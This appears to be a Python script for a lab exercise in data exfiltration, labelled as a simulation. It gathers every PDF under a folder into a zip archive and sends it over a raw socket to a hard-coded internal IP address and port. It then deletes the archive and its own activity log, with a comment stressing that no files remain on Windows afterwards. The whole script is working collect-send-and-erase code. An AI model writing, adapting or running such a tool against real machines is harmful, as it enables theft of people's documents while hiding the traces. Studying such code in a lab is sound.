import os
import zipfile
import socket
import logging
import tempfile
import shutil

# =========================
# Create Temporary Workspace
# =========================
temp_dir = tempfile.mkdtemp()
zip_path = os.path.join(temp_dir, "pdfs.zip")
log_path = os.path.join(temp_dir, "activity.log")

# =========================
# Logging Configuration
# =========================
logging.basicConfig(
    filename=log_path,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

logging.info("Sender started (Simulation Mode)")

# =========================
# Configuration
# =========================
LAB_FOLDER = "Test"
SERVER_IP = "192.168.232.129"
PORT = 9001
CHUNK_SIZE = 4096   #size of data that will send once time

# =========================
# Collect PDFs
# =========================
logging.info("Collecting PDF files")

with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
    for root, _, files in os.walk(LAB_FOLDER):
        for file in files:
            if file.lower().endswith(".pdf"):
                file_path = os.path.join(root, file)
                zipf.write(file_path)
                logging.info(f"Collected: {file_path}")

# =========================
# Send File
# =========================
s = socket.socket()
s.connect((SERVER_IP, PORT))
logging.info("Connected to receiver")

with open(zip_path, "rb") as f:
    while chunk := f.read(CHUNK_SIZE):
        s.send(chunk)

s.close()
logging.info("File sent successfully")

# =========================
# Cleanup (IMPORTANT)
# =========================
logging.info("Closeing the logging file")    
logging.info("Cleaning temporary files")

for handler in logging.root.handlers[:]:
    handler.close()                     # for cloeaing logging file "Becousa windos will not end runing the 
    logging.root.removeHandler(handler) # prog intull logging file is closeaed "
    
shutil.rmtree(temp_dir)

# No files remain on Windows after execution
